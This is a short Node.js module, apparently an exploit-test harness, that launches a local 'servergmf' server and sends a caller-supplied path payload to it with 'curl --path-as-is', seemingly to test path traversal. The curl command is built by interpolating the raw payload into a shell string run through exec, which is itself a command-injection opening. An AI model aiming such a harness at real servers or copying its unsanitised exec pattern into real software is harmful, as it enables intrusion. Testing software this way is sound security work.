const { exec } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
    let server = "node ./node_modules/servergmf/index.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    return new Promise((resolve, reject) => {
        exec(attack_string, (error, stdout) => {
            if (error) {
                reject(error);
            } else {
                resolve(stdout);
            }
        });
    });
}

module.exports = { exploitFunction };